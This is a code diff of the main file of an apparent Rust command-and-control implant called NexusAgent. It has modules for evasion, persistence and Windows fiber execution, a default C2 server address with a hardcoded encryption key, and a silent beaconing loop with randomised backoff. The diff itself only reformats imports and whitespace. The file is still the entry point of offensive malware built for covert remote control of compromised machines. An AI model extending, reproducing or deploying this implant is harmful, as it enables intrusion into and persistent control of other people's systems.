@@ -5,10 +5,10 @@ use tokio::time::sleep;
 
 mod agent;
 mod communication;
-mod execution;
-mod system;
-mod persistence;
 mod evasion;
+mod execution;
+mod persistence;
+mod system;
 
 #[cfg(target_os = "windows")]
 mod fiber_execution;
@@ -35,7 +35,7 @@ async fn main() -> Result<()> {
     // Parse command line arguments with proper flag handling
     let args: Vec<String> = env::args().collect();
     let mut server_addr = "https://c2.your-domain.com:8443".to_string(); // Use 8443 to match server config
-    
+
     // Parse --grpc-endpoint flag properly
     for i in 1..args.len() {
         if args[i] == "--grpc-endpoint" && i + 1 < args.len() {
@@ -49,15 +49,14 @@ async fn main() -> Result<()> {
 
     // Create encryption key (in production, this should be embedded or derived)
     let encryption_key = [
-        0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF,
-        0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54, 0x32, 0x10,
-        0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF,
-        0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54, 0x32, 0x10,
+        0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, 0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54, 0x32,
+        0x10, 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, 0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54,
+        0x32, 0x10,
     ];
 
     // Initialize the agent
     let mut agent = NexusAgent::new(server_addr, encryption_key).await?;
-    
+
     // Main agent loop with error recovery
     loop {
         match agent.run_cycle().await {
@@ -70,7 +69,7 @@ async fn main() -> Result<()> {
                 // Log error in debug mode, otherwise fail silently
                 #[cfg(debug_assertions)]
                 eprintln!("Agent cycle error: {}", e);
-                
+
                 // Exponential backoff on errors
                 let error_delay = rand::random::<u64>() % 300 + 60; // 1-6 minutes
                 sleep(Duration::from_secs(error_delay)).await;
@@ -87,7 +86,7 @@ mod tests {
     async fn test_agent_initialization() {
         let server_addr = "127.0.0.1:4444".to_string();
         let key = [0u8; 32];
-        
+
         // This should not panic
         let agent = NexusAgent::new(server_addr, key).await;
         assert!(agent.is_ok());
